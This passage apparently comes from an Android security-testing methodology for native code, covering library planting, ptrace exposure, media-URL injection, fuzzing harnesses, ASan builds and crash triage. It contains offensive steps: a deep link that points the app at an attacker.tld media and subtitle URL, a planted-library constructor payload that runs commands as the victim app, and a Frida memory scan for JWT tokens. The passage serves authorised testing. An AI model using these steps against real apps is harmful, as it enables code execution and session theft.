  the fetch carries the app's credentials.
- **How:**
  ```bash
  S=out/sources
  grep -rnE 'Glide\.with|Coil|Fresco|ImageDecoder\.|BitmapFactory\.decode|MediaItem\.fromUri|setMediaItem|createMediaSource|HlsMediaSource|DashMediaSource|ProgressiveMediaSource|setSubtitleConfigurations' $S | head -40
  grep -rn 'MediaItem.fromUri' -B12 $S | grep -nE 'getIntent|getQueryParameter|extras|push'
  # what does the decoder actually resolve to?
  strings -a x/lib/*/libavif_android.so 2>/dev/null | grep -iE 'dav1d|libavif|[0-9]+\.[0-9]+\.[0-9]+'
  adb shell am start -a android.intent.action.VIEW \
    -d 'target://play?src=https://attacker.tld/evil.m3u8&sub=https://attacker.tld/a.vtt'
  ```
  Serve malformed bytes from your own host and watch the native side:
  ```bash
  python3 -m http.server 8080 --directory ./malformed &
  adb logcat -b crash -d | grep -A30 'signal 11'
  ```
- **Proof:** Your host receives the request (with the app's User-Agent and any `Authorization` header — log
  the headers, they are half the finding), and the app either renders your content or crashes in the native
  demuxer/decoder with a tombstone. The worked shape from this corpus: `libavif_android.so` fingerprinted as
  **libavif 1.4.2 / dav1d 1.1.1** (stale), reached via Glide on any product image — a memory-safety
  *candidate* until the crash exists.
- **Escalation:** → D14 if the fetch is unpinned (the MitM variant, AM-06); → D15 if the fetch carries
  credentials (a credential-leaking SSRF-shaped primitive); → D16-044 to build the ASan harness against the
  fingerprinted decoder version.
- **Ruled out when:** every media/image URL the app loads comes from a fixed allowlist of first-party hosts
  over pinned TLS, with no deep-link, push-payload, QR or WebView-bridge path able to set it — traced from
  each `Glide.with(...).load(X)` call site to the origin of `X`.

### D16-038 · Same-process HALs: vendor GPU code inside the app's address space, holding a kernel fd

| | |
|---|---|
| **Severity ceiling** | Medium–High as reported to the client (their app's attack surface includes unaudited vendor code and a live kernel device handle); the exploitable bug itself is an OEM/kernel finding |
| **VRT** | n/a directly; it is the argument that an in-process memory bug is not merely "the app crashes" |
| **Attacker** | AM-02 / AM-09 (shaders, textures, image decode reaching the GPU stack) |
| **Applies to** | all; OpenGL, Vulkan, RenderScript, `android.hidl.memory@1.0` and the stable C mapper are documented same-process HALs. RenderScript is deprecated but the SP-HAL remains on many devices |
| **Maps to** | AOSP "HAL types" (SP-HALs are "a restricted set of wrapped interfaces controlled by Google that run directly within client processes"); AOSP linker-namespace `sphal` namespace; ATT&CK T1575 |

- **Test:** Confirm that vendor code is mapped into the app's own process and that the process holds an open
  GPU device node. Any app-reachable input flowing into that code (shaders, textures, image decode,
  RenderScript kernels) is a memory-safety surface **in the app's UID** and a stepping stone to the GPU
  kernel driver.
- **How:**
  ```bash
  PID=$(adb shell pidof com.target.app)
  adb shell cat /proc/$PID/maps | grep -E 'vendor|/apex/|libGLES|libvulkan|libRS|mali|adreno|powervr'
  adb shell ls -l /dev/kgsl-3d0 /dev/mali0 /dev/dri/* 2>/dev/null
  adb shell ls -lZ /proc/$PID/fd/ | grep -E 'kgsl|mali|dri'
  grep -RnE 'RenderScript|ScriptC|GLSurfaceView|Vulkan|SurfaceTexture|ImageDecoder|BitmapFactory\.decode' out/sources/
  ```
- **Proof:** `/proc/<pid>/maps` showing `/vendor/lib64/egl/libGLES_mali.so` (or the Adreno/PowerVR
  equivalent) mapped into the app process, together with `/proc/<pid>/fd` holding an open GPU device node —
  proving the app process directly holds a kernel driver handle reachable from any in-process bug.
- **Escalation:** → D25 (OEM/kernel VRP). Related behaviour change worth checking on the same device:
  **Android 16** blocks deprecated/development Mali GPU IOCTLs in production and restricts profiling IOCTLs
  to shell or debuggable apps. Look for the workaround:
  ```bash
  adb logcat -b events -d | grep 'avc:.*denied.*dev/mali0'
  adb shell dmesg | grep -i 'avc.*mali'
  aapt2 dump badging base.apk | grep -i debuggable
  ```
  A shipped **debuggable** production variant to keep GPU profiling working is a High and chains to D02.
- **Ruled out when:** the app process maps no vendor library and holds no GPU/DRM device fd after exercising
  every graphics-touching screen — which in practice means the app renders only through the framework's own
  views. Record which screens you exercised.

### D16-039 · Native library loaded from a path the attacker can write

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) |
| **Attacker** | **AM-03** (a co-located app writing the file) or AM-09 (the app downloads it) |
| **Applies to** | **API gate:** apps targeting **API 29+** cannot execute native code from the app's *internal* data storage — the external-storage and pre-29 variants remain live. Also check `android:extractNativeLibs`: with `extractNativeLibs="false"` (the AGP 3.6 / targetSdk-30-era default) libraries load uncompressed from the APK and there is no `lib-*/` directory to overwrite |
| **Maps to** | ATT&CK T1625.001 (System Runtime API Hijacking), T1407 (Download New Code at Runtime, mitigation M1006), T1575; CWE-829, CWE-494; H1 #1377748 (Evernote, High), #1115864 (Mattermost, High 7.8) |

- **Test:** Find every loader and where it reads from. `System.load()` on an absolute path under the data
  directory, the cache, or external storage — or a `dlopen()` on a downloaded file — is a library-planting
  primitive and therefore code execution as the app.
- **How:**
  ```bash
  grep -rnE 'System\.load\(|System\.loadLibrary\(|dlopen|LD_LIBRARY_PATH|getExternalFilesDir|getExternalCacheDir|Environment\.getExternalStorage' out/sources/
  strings -a x/lib/*/*.so | grep -E '^/sdcard|^/storage|^/data/data/.*/(cache|files)/'
  grep -n 'extractNativeLibs' x/AndroidManifest.xml
  adb shell run-as com.target.app ls -la /data/data/com.target.app/lib-1/ /data/data/com.target.app/lib-main/ 2>/dev/null
  adb shell getprop ro.product.cpu.abi
  ```
  Observe the loads at runtime — this catches paths that are computed:
  ```javascript
  Java.perform(function () {
    var S = Java.use('java.lang.System');
    S.load.implementation = function (p) { console.log('System.load -> ' + p); return this.load(p); };
  });
  Interceptor.attach(Module.findExportByName(null, 'dlopen'), {
    onEnter(a) { console.log('dlopen ' + a[0].readCString()); }
  });
  ```
  Minimal payload — a constructor proves execution without any app cooperation:
  ```c
  __attribute__((constructor)) static void go(void) {
      system("id > /data/data/com.target.app/files/PWNED");
  }
  ```
- **Proof:** `adb shell run-as com.target.app cat files/PWNED` printing `uid=10xxx(u0_aXXX)` matching the
  victim app's UID after a relaunch, plus `Process.enumerateModules()` listing your library's path inside the
  target process.
- **Escalation:** → D17 (persistent code execution across restarts); → D21 (your library's constructor runs
  before every RASP check). The known real-world shapes: TikTok's `lib-main/libimagepipeline.so`,
  `app_librarian/.../libAkeva.so` and `app_lib/libuserinfo.so`; Microsoft's Dirty Stream against Xiaomi's
  `files/lib/libixiaomifileu.so` loaded via `System.load` after a hash check the attacker also controlled;
  Samsung `com.samsung.android.app.dofviewer` loading attacker libraries from a crafted JPEG via
  `System.load()` with no verification.
- **Ruled out when:** every load is `System.loadLibrary()` against the APK's own `lib/` with
  `extractNativeLibs="false"`, and the runtime `dlopen` hook shows no path outside `/data/app/…/lib/` or
  `/apex/` across a full app exercise. **Report the negative honestly** — the reference case for this is a
  researcher who ran exactly these hooks, found no loader reading a writable path, and correctly did *not*
  claim RCE.

### D16-040 · Linker-namespace violation: the app loads a private platform or vendor library

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | n/a standalone; it is a portability *and* security observation |
| **Attacker** | AM-12 to observe; the risk is vendor code executing inside the app sandbox |
| **Applies to** | **API gate:** enforced from **targetSdk 24** — apps may only `dlopen()` allowlisted public libraries. **LEGACY: unrestricted below targetSdk 24** |
| **Maps to** | AOSP "Namespaces for native libraries" (`/system/etc/public.libraries.txt`, `/vendor/etc/public.libraries.txt`, `/system/etc/public.libraries-COMPANYNAME.txt`, `lib*COMPANYNAME.so` naming, `same_process_hal_file` SELinux label, CDD 3.1.1); AOSP "Linker namespace" (`default`/`sphal`/`vndk`/`rs`; `search.paths`/`permitted.paths`/`visible`) |

- **Test:** An app that loads `/system/lib64/<private>.so` or a vendor library is either targeting an old SDK
  or relying on an OEM-specific allowlist. Both matter: the app's security posture then varies by OEM image,
  and on the OEM device it executes vendor code inside its own sandbox.
- **How:**
  ```bash
  grep -RnE 'System\.load\("/(system|vendor|apex)/' out/sources/
  adb shell cat /system/etc/public.libraries.txt
  adb shell ls /system/etc/public.libraries-*.txt 2>/dev/null
  adb logcat | grep -iE 'dlopen failed|library ".*" not found|is not accessible for the namespace'
  ```
  Run the same flow on a Pixel/AOSP build and on the OEM build and diff.
- **Proof:** A logcat line `dlopen failed: library "libfoo.so" not found` or
  `… is not accessible for the namespace "classloader-namespace"` on a device without the OEM allowlist,
  against a successful load on the OEM device — that pair proves OEM-specific behaviour.
- **Escalation:** → D25; → D22 (the behaviour varies by platform version and by OEM, which is exactly the
  kind of divergence a client's own QA does not cover).
- **Ruled out when:** every `System.load`/`dlopen` path resolves inside the app's own APK, `/apex/`, or a
  library named in `public.libraries.txt` on a stock build — verified by a clean run with no namespace
  denial in logcat.

### D16-041 · Framework-plugin `.so` files: the JNI boundary an "otherwise managed" app still has

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with execution; otherwise rate the crash |
| **Attacker** | AM-02 / AM-03 depending on which bridge reaches the plugin |
| **Applies to** | Flutter, React Native, Unity, Xamarin, Qt and Cordova builds — all of which ship third-party native plugins that do their own string and buffer handling |
| **Maps to** | MASTG-TECH-0140, MASTG-TOOL-0107 (jnitrace), MASTG-TOOL-0129 (rabin2), MASTG-TOOL-0003 (nm); MASWE-0050 |

- **Test:** A "managed" cross-platform app still has a native attack surface: every plugin ships a `.so` with
  `Java_*` exports, and the runtime bridge (MethodChannel, `nativeModuleProxy`, `UnityPlayer.UnitySendMessage`,
  `QAndroidJniObject`) is the delivery path into it.
- **How:**
  ```bash
  unzip -l base.apk | grep -E 'libmonodroid|libunity|libflutter|libhermes|index.android.bundle|assets/www|assets/Data|QtAndroid'
  for so in x/lib/arm64-v8a/*.so; do echo "== $so"; nm -D "$so" 2>/dev/null | grep ' T Java_'; done
  rabin2 -s x/lib/arm64-v8a/libX.so | grep JNI
  jnitrace -l libX.so -f com.target.app
  grep -rnE 'MethodChannel|EventChannel|BasicMessageChannel|setMethodCallHandler|@ReactMethod|UnityPlayer\.UnitySendMessage|QAndroidJniObject|invokeMethod' out/sources | head -40
  ```
  Enumerate the channel names and drive them directly:
  ```javascript
  // Flutter: capture every channel name and every call with its arguments
  Java.perform(function () {
    var MC = Java.use('io.flutter.plugin.common.MethodChannel');
    MC.$init.overload('io.flutter.plugin.common.BinaryMessenger', 'java.lang.String').implementation =
      function (m, name) { console.log('[MethodChannel] ' + name); return this.$init(m, name); };
    var MCall = Java.use('io.flutter.plugin.common.MethodCall');
    MCall.$init.overload('java.lang.String', 'java.lang.Object').implementation = function (m, a) {
      console.log('[call] ' + m + ' ' + a); return this.$init(m, a);
    };
  });
  ```
  ```javascript
  // React Native: list the native modules the bridge exposes, then call the dangerous ones
  console.log(Object.keys(this.nativeModuleProxy || {}));
  ```
- **Proof:** A `Java_*` export reachable from a framework channel/bridge with attacker-controlled input, plus
  a crash with a controlled fault address under a size or format fuzz. **Do not report an unreached export.**
- **Escalation:** → D19 for the framework-layer analysis (Hermes bundle, Dart AOT snapshot); → D10 when the
  bridge is JS-reachable; a path-taking channel method combined with the D04 route-injection primitive is an
  attacker-reachable arbitrary file operation.
- **Ruled out when:** the plugin `.so` set contains only framework runtimes with no app- or plugin-specific
  `Java_*` export (D16-003), and the channel enumeration shows every handler validating its arguments before
  the native call. Remember D16-011's exclusions before also reporting these libraries as canary-less.

### D16-042 · Debug and ptrace exposure of the running process

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (**P1**) if a live token is scraped from memory and used; otherwise rate the disclosure |
| **Attacker** | AM-03/AM-04 **only if** the app is debuggable; otherwise AM-12 (not an attack) |
| **Applies to** | all. ATT&CK notes "Both Android and iOS lack legitimate process injection methods; it requires root access or vulnerability exploitation" — so on a stock device this is gated by the debuggable flag or by root |
| **Maps to** | ATT&CK T1631.001 (Ptrace System Calls), T1631, T1617 (Hooking); MASTG-TECH-0044; CWE-200 |

- **Test:** Can another process attach to the app? The three conditions are the `android:debuggable` flag,
  the device's `ptrace_scope`, and whether the app calls `PR_SET_DUMPABLE(0)`. An attachable process is a
  live memory-disclosure and code-injection surface.
- **How:**
  ```bash
  PID=$(adb shell pidof -s com.target.app)
  adb shell "cat /proc/$PID/status | grep -E 'TracerPid|Seccomp|VmLck'"
  adb shell "su -c 'cat /proc/sys/kernel/yama/ptrace_scope'" 2>/dev/null
  aapt2 dump badging base.apk | grep -i debuggable
  grep -rnE 'prctl|PR_SET_DUMPABLE|ptrace|TracerPid' out/sources/ x/lib/*/*.so
  frida -U -n com.target.app -e 'Process.enumerateModules().slice(0,5)'
  ```
  Scrape the heap for session material:
  ```javascript
  Memory.scanSync(Process.getModuleByName('libc.so').base, 0x1000000, '65 79 4a')   // "eyJ" — JWT prefix
  ```
- **Proof:** Frida attaching to the **release** build by name (not spawn) on a **non-rooted** device, plus a
  memory scan recovering a plaintext token — and the `aapt2` line showing `application-debuggable`. Without
  the debuggable flag this is AM-12 and is not a finding.
- **Escalation:** → D02 (the debuggable production build is the real report); → D13/D15 with the scraped
  token. Note the corpus's live example of a production-debuggable workaround: apps shipping a debuggable
  variant so that Android 16's restricted Mali profiling IOCTLs keep working (D16-038).
- **Ruled out when:** `aapt2 dump badging` shows no `application-debuggable`, and attaching from a
  non-rooted device fails. On your own rooted harness Frida will always attach — that is AM-12 and proves
  nothing.

### D16-043 · `mlock` reduced to 64 KB per process (Android 14) — key buffers the app thought were pinned

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | rate on the material exposed; `sensitive_data_exposure.disclosure_of_secrets.*` per what the key protects |
| **Attacker** | AM-10/AM-11 (memory captured from a dump/hibernation image) or AM-12 with a core dump |
| **Applies to** | **Android 14+**, all apps with native key handling |
| **Maps to** | `developer.android.com/about/versions/14/behavior-changes-all` ("Maximum memory lockable via `mlock()` reduced from 64 MB to 64 KB per process"); CWE-312 |

- **Test:** Native code that `mlock`ed a key buffer to keep it out of swap and hibernation now fails for
  anything larger than 64 KB — typically **silently**, because the return value is not checked.
- **How:**
  ```bash
  grep -rn 'mlock\|mlockall\|MADV_DONTDUMP\|memset_s\|explicit_bzero' native-src/
  nm -D x/lib/*/*.so | grep -E ' U (mlock|mlockall|madvise|explicit_bzero|memset_s)$'
  adb shell cat /proc/$(adb shell pidof com.target.app)/status | grep -i vmlck
  ```
- **Proof:** `VmLck` far below the buffer size the code intends to lock, with the `mlock` return value
  unchecked in the decompiled native code. Pair it with a memory dump showing the key present in a
  non-locked region.
- **Escalation:** → D12 (key extraction); this is also the reason a "we keep the key pinned in native memory"
  design claim in a client's documentation is no longer true on Android 14+, which is worth stating plainly.
- **Ruled out when:** the app locks ≤64 KB and checks the `mlock` return, or it never claims memory pinning
  as a control at all — in which case the item does not apply and you say so in one line.

### D16-044 · Choose the fuzzer from the constraint, then build a harness that drives the DEEP path

| | |
|---|---|
| **Severity ceiling** | Support (it is the machinery; the crash is the finding) |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | any app-reachable native parser you are authorised to fuzz; check the programme's scope before running anything against a vendor's production infrastructure |
| **Maps to** | MASTG-TECH-0037 (Symbolic Execution) as the alternative when the input space is narrow; MASTG-TOOL-0030 (Angr) |

- **Test:** Pick the engine from what you actually have, not from fashion:
  - source + a callable parser/decoder → **libFuzzer** (in-process, fast, pairs with ASan/UBSan)
  - whole program or binary-only → **AFL++** (compiler instrumentation; QEMU mode for closed binaries;
    Frida mode to hook functions in mobile apps and `.so`)
  - customisable/scalable pipeline → **LibAFL** (modular, distributed, QEMU + Frida backends)
  - lean fork-server → **Honggfuzz**
- **How:**
  ```bash
  afl-fuzz -i corpus/ -o findings/ -- ./fuzz_harness @@              # instrumented
  afl-fuzz -Q -i corpus/ -o findings/ -- ./fuzz_harness_noinst @@    # QEMU, no source
  ```
  The harness rules that decide whether a campaign finds anything: **deterministic** (no global state),
  **guard-railed** (size and dimension caps to avoid OOM and timeouts), **leak-free on every path**, and
  **driving the deep path** — actually decode, do not just sniff the header. Also **watch the log during the
  first minutes of any run**: unsupported features burn cycles silently, and pruning them is usually worth
  more than any generator change.
- **Proof:** The measured difference between a shallow and a deep harness, which is the reason this item
  exists. A first libwebp harness that reached only the Huffman code took **8–10 hours**; the refined
  VP8L-gated harness — RIFF/WEBP magic check, require a `VP8L` chunk, 32 KiB per-chunk cap, `WebPGetFeatures`
  probe, clamp to 256×256, decode into a caller-allocated buffer with `WebPDecodeRGBAInto` — reproduced
  CVE-2023-4863 in **2–3 hours with no OOMs**. Measured comparison on libopenapv over 60-second runs: an
  AFL++ decode harness found 16 unique crashes (corpus 1→49, 167 edges, 24.7% bitmap coverage); an AFL++
  random-metadata harness found 8 with **first crash at 0.38 s**; blackbox produced 483/500 crashing inputs;
  whitebox coverage-guided produced 500/500 (corpus 1→29, 162 edges).
- **Escalation:** Every unique bucket → D16-050 (triage) → a root cause → a finding.
- **Ruled out when:** the target has no callable parser boundary you can isolate (all parsing is interleaved
  with framework callbacks), in which case say so and fall back to input-driven testing through the real
  surface (D16-035) rather than pretending a harness exists.

### D16-045 · Build the ASan/UBSan harness against the app's own `.so` and cross-compile it on-device

| | |
|---|---|
| **Severity ceiling** | Critical (the ASan verdict is what rates the finding) |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) via the bug it finds |
| **Attacker** | AM-01/AM-02 per the delivery path |
| **Applies to** | all apps shipping `.so` parsers, and any third-party library you can rebuild from source |
| **Maps to** | MASTG-KNOW-0005; CWE-787, CWE-125, CWE-190 |

- **Test:** An out-of-bounds read does not always crash. ASan is the bug oracle that turns "it did not crash"
  into a named verdict with an offset. Build the harness, run it on the host, then **reproduce it on real
  hardware** — an on-device ASan report is materially more persuasive than a host one.
- **How:** Host build:
  ```bash
  clang++ -O1 -g \
    -fsanitize=address,undefined -fno-omit-frame-pointer \
    -fsanitize=fuzzer \
    target_fuzz.cc -o target_fuzz
  ./target_fuzz -timeout=10 in/ seeds/
  ```
  Cross-compile the reproducer for the device:
  ```bash
  NDK=$HOME/Library/Android/sdk/ndk/29.0.13599879
  CC=$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android31-clang
  ASAN_RT=$NDK/toolchains/llvm/prebuilt/darwin-x86_64/lib/clang/20/lib/linux/libclang_rt.asan-aarch64-android.so

  cmake .. -DCMAKE_TOOLCHAIN_FILE=$NDK/build/cmake/android.toolchain.cmake \
    -DANDROID_ABI=arm64-v8a -DANDROID_PLATFORM=android-31 \
    -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_C_FLAGS="-g -O0 -fsanitize=address -fno-omit-frame-pointer"
  make -j$(nproc)

  $CC -g -O0 -fsanitize=address -fno-omit-frame-pointer \
    -I../inc -I./include poc.c ./lib/libtarget.a -lm -o poc

  adb push poc $ASAN_RT /data/local/tmp/
  adb shell "LD_LIBRARY_PATH=/data/local/tmp ASAN_OPTIONS=detect_leaks=0 /data/local/tmp/poc /data/local/tmp/input"
  ```
- **Proof:** An ASan report naming the access type, size and byte offset relative to the allocation — e.g.
  `heap-buffer-overflow … READ of size 1 … is located 0 bytes after 333-byte region` — produced **on the
  target device**, with `adb shell getprop ro.build.fingerprint` captured alongside. UBSan gives the same
  precision for arithmetic: `sqlite3.c:178614:24: runtime error: signed integer overflow: 1200 * 1893939
  cannot be represented in type 'int'`.
- **Escalation:** WRITE outranks READ; a WRITE reached through `memcpy`/`memmove` outranks both (D16-050).
  → D16-053 before rating.
- **Ruled out when:** the corpus and the mutated inputs produce no sanitizer verdict after a run long enough
  to reach meaningful coverage (report the edge count and the corpus growth, not the wall-clock time), and
  the harness demonstrably drives the deep path — shown by a coverage report reaching the decode function,
  not just the header check.

### D16-046 · Replicate the caller's exact call sequence — the reachability rule that decides payout

| | |
|---|---|
| **Severity ceiling** | Critical (this item is what makes the Critical payable) |
| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) |
| **Attacker** | per the real path, not per your harness |
| **Applies to** | every memory-safety submission, at every programme in this corpus |
| **Maps to** | Google "Invalid Reports → Unreachable bugs"; Samsung ineligible list and downgrade factors; TikTok exploit requirement |

- **Test:** A crash you produced by `dlopen`-ing a library and calling its internal functions directly is
  **not a finding**. Every major programme says so in writing. Your harness must replicate the sequence the
  real caller performs, and your PoC must be delivered through a real app surface.
- **How:** Read the consuming component and mirror it exactly. The worked example: to attack `libopenapv`
  statically linked inside `libcodec2_soft_apvdec.so`, the harness replicated `C2SoftApvDec::process()` — parse
  the MP4, extract the sample from `mdat`, call `oapvd_info()` for dimensions, allocate output buffers from
  those dimensions, call `oapvd_decode()` — then was compiled with ASan against the vulnerable source and run
  on-device. You cannot `LD_PRELOAD` ASan into a system binary: **ASan requires compile-time instrumentation
  of every memory access, and the system binary has none.**
  ```bash
  # confirm the real path is the one that crashes
  adb logcat -b crash -d | grep -E 'Executable:|Cmdline:|#0[0-9] '
  ```
- **Proof:** The same input produces (a) the ASan verdict in your replica harness and (b) a tombstone in the
  real process, reached through the app's own delivery path. Quote both. The programme language you are
  satisfying, verbatim: *"Be especially careful if you're building a Proof of Concept (PoC) that links to a
  library and calls functions directly, if those functions would not be callable directly when using normal
  Android APIs"*; and *"Crashes produced by artificially bypassing the product's normal attack surface (for
  example, loading a native library via `dlopen` and calling its internal APIs with malformed input) are not
  treated as a valid security impact unless evidence shows the same input is reachable through a real attack
  path."*
- **Escalation:** This is the gate on every payout in this domain. Budget the time for the delivery path, not
  just for the crash.
- **Ruled out when:** you cannot construct any real-caller sequence that reaches the crashing function — in
  which case the bug is upstream's to fix and yours to report to the library, not to the app programme. Say
  that explicitly rather than filing it.

### D16-047 · Binary-only targets: AFL++ QEMU persistent mode, LibAFL QEMU, LibAFL Frida

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | AArch64 Android `.so` with no source; vendor/firmware parsers (scope permitting — this is usually D25 work, not app-scope) |
| **Maps to** | MASTG-TOOL-0001 (Frida, for the Frida-mode backend) |

- **Test:** Fork-per-execution in QEMU mode is the usual reason a campaign is "too slow to find anything".
  Choose the backend by what you can rebuild.
- **How:** **AFL++ QEMU persistent mode** — expose a dedicated entry function (`fuzz_entry()`), set AFL++'s
  persistent address to it, and install a hook that writes AFL's input straight into guest memory (on AArch64
  `x0` points at the target buffer and `x1` carries the size), so no file I/O happens per iteration; disable
  Scudo randomness and reduce its logging for stability. Emulating a firmware rootfs:
  ```bash
  export QEMU_LD_PREFIX=/path/to/android/rootfs
  export QEMU_SET_ENV="LD_LIBRARY_PATH=/system/lib64:/vendor/lib64"
  AFL_INST_LIBS=1 afl-fuzz -Q -i seeds/ -o out/ -- ./harness_shim @@
  ```
  **LibAFL QEMU user mode** — the pieces that actually matter: point QEMU at the rootfs with `-L <rootfs>` so
  it finds `linker64`/`libc.so`; inject guest env with `-E VAR=…` including `ASAN_OPTIONS=abort_on_error=1`
  (a polite ASan exit is invisible to crash feedback); resolve `LLVMFuzzerTestOneInput` from the ELF with
  `EasyElf`; breakpoint **both** the function and its return address so one run equals one input; `mmap` a
  fixed input buffer once and overwrite it per iteration; snapshot and restore PC/SP/LR each run and set
  `arg0=data_ptr`, `arg1=size` per the guest ABI. When the loop "doesn't do anything", check three things:
  are we writing input to the right place, is PC set correctly, are we stopping at the right return address.
  **LibAFL Frida mode** — statically link the target + zlib into a harness built with `-fsanitize=address`,
  have the fuzzer link the ASan runtime at load time (via `build.rs`) so ASan's malloc interceptors install
  **before** the harness is `dlopen`ed, then drive `LLVMFuzzerTestOneInput` through `FridaInProcessExecutor`
  with `CoverageRuntime` (and optionally `CmpLogRuntime`).
  **Build a shim with a stable C ABI** rather than `dlsym`-ing C++ symbols — they are inlined, hidden,
  optimised away or renamed between firmware builds:
  ```
  harness (C)  ->  libshim_target.so (C++, stable C ABI)  ->  libvendor.so
     shim_make_codec_from_data() / shim_get_info() / shim_get_pixels() / shim_destroy_codec()
  ```
- **Proof:** Throughput and objectives. Persistent mode lifts throughput by orders of magnitude over fork
  mode (a LibAFL QEMU run reported **8,000 executions/sec on a single core**); a QEMU-mode firmware campaign
  produced its first crash matching CVE-2020-8899 in **47 minutes** and 674 crashes overall; LibAFL Frida
  mode rediscovered CVE-2025-64505 **in under 2 minutes from the seed corpus** — where the harness detail
  that made the bug reachable at all was calling `png_set_quantize` with `full_quantize = 0`. Validate the
  setup first by decoding a known-good file and printing a correct header struct.
- **Escalation:** → D16-050 (triage the pile); → D25 if the target is vendor firmware rather than the app.
- **Ruled out when:** the target library is source-available and rebuildable, in which case use D16-045 —
  compiler instrumentation is faster and gives better verdicts than emulation.

### D16-048 · Ship the Android ASan runtime with the emulated target

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | any ASan-built harness running against a firmware rootfs under QEMU |
| **Maps to** | n/a (setup) |

- **Test:** A harness built with ASan against a firmware rootfs runs on **Bionic, not glibc** — it needs
  ASan's *Android* runtime present inside that rootfs. This exact confusion is the top cause of "ASan
  produces nothing" in emulated Android fuzzing.
- **How:**
  ```bash
  cp $NDK/toolchains/llvm/prebuilt/*/lib/clang/*/lib/linux/libclang_rt.asan-aarch64-android.so \
     /path/to/android/rootfs/system/lib64/
  unset LD_PRELOAD                                   # clear the HOST preload
  export QEMU_LD_PREFIX=/path/to/android/rootfs      # host-side resolution
  export QEMU_SET_ENV="LD_LIBRARY_PATH=/system/lib64:/vendor/lib64,ASAN_OPTIONS=abort_on_error=1"
  ```
  Both variables matter and they do different things: `QEMU_LD_PREFIX` tells QEMU where the target's loader
  and libraries live; `QEMU_SET_ENV` puts variables into the **target** environment, not the host's.
- **Proof:** ASan reports appear with resolved frames instead of the target dying silently or the run
  inheriting host libraries.
- **Escalation:** → D16-050, D16-051.
- **Ruled out when:** you are running natively on-device (D16-045) rather than under emulation, in which case
  push the runtime next to the binary and set `LD_LIBRARY_PATH=/data/local/tmp` instead.

### D16-049 · Capture the tombstone, not the fact of a crash

| | |
|---|---|
| **Severity ceiling** | Support (but it is the mandatory evidence for every finding above) |
| **VRT** | n/a; without this artefact a memory-safety claim will not triage at all |
| **Attacker** | n/a |
| **Applies to** | every crash finding in this chapter |
| **Maps to** | MASTG-TECH-0044; the AOSP tombstone format |

- **Test:** "The app crashed" is not evidence. Collect the full tombstone with build fingerprint, faulting
  thread name, signal, abort message and backtrace — in one artefact.
- **How:**
  ```bash
  adb shell getprop ro.build.fingerprint
  adb shell getprop ro.build.version.security_patch
  adb logcat -c
  # ... trigger ...
  adb logcat -b crash -d > crash.txt
  adb shell ls -t /data/tombstones | head -1
  adb pull /data/tombstones/<tombstone_N> .
  adb bugreport crash.zip          # fallback on a non-rooted device: FS/data/tombstones/
  ```
- **Proof:** A tombstone containing every element a triager needs:
  ```
  F DEBUG : Build fingerprint: 'google/sdk_gphone64_arm64/emu64a:15/AE3A.240806.036/12592187:user/release-keys'
  F DEBUG : Cmdline: com.google.android.documentsui
  F DEBUG : pid: 28652, tid: 28725, name: loads.documents
  F DEBUG : Abort message: 'ubsan: add-overflow by 0x00000075ec2dcc18'
  F DEBUG : backtrace: #02 pc 0000000000088c14 libdng_sdk.so (dng_opcode_MapTable::ProcessArea+388) …
  ```
  **`user/release-keys` in the fingerprint is what proves the finding is not emulator-only** — capture it
  every time.
- **Escalation:** The tombstone is the artefact that moves the finding out of
  `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5). Pair it with the
  one-shot reproduction script (D16-059).
- **Ruled out when:** n/a — unconditional. If you cannot obtain a tombstone because the device is not rooted
  and `bugreport` is stripped, say so and use the `logcat -b crash` block, stating the limitation.

### D16-050 · Triage at scale: replay → parse → bucket → rank

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | any fuzzing output; also the discipline that stops you filing 674 duplicates |
| **Maps to** | n/a (process) |

- **Test:** A pile of crashes is not a set of findings. Convert every crash into a structured record and
  collapse it to unique root causes before you write anything.
- **How:** For each file in `out/default/crashes/*`, replay under `afl-qemu-trace` with the target ASan
  environment, capture the log, parse it deterministically, and emit Markdown/CSV/JSON. The constraints that
  actually matter:
  - always set `QEMU_LD_PREFIX` + `QEMU_SET_ENV` (target/Bionic ASan) and clear the host `LD_PRELOAD`
  - wrap runs in `script -q -c` to avoid truncated ASan logs; detect truncation and retry without the wrapper
  - parse deterministically: prefer ASan's `SUMMARY:` line for the primary library and function; otherwise
    take the first non-ASan frame
  - keep the ranking heuristics explicit: **UAF/double-free → CRITICAL; WRITE ranks above READ; a path
    through `memcpy`/`memmove` on a WRITE lifts exploitability one tier**
  Automate the mechanical parts and keep the judgement manual: let a tool write the subprocess wrappers, the
  writers and the regex scaffolding; validate it on a known input (run one crash by hand, diff the terminal
  ASan output against the saved log, confirm the parser extracts the same `SUMMARY` and call chain); then
  decide by hand which buckets are unique root causes, how exploitability ranks, and whether a given "read
  overflow" is realistically exploitable given the surrounding code and allocations.
- **Proof:** The bucketing table. The reference result: **674 crashes → 12 unique root causes**, with the
  top bucket (423 inputs) all sharing one root cause. The category breakdown for calibration:
  `read-memcpy` 287 (68.01%), `read-4` 102 (24.17%), `write` 16 (1.86%), `sigabrt` 14 (3.32%),
  `read-16` 3 (0.71%) — **the WRITE bucket is where the Criticals live** and it is 2% of the pile.
- **Escalation:** Each unique bucket → a root-cause analysis (D16-051) → one finding, filed separately
  (D16-060).
- **Ruled out when:** n/a — if you have crashes, you triage them. Filing an untriaged crash pile is the
  behaviour Google's "raw, un-minimized fuzzer crashes are not actionable" clause exists to reject.

### D16-051 · Root cause is the first ill behaviour, not the crash site

| | |
|---|---|
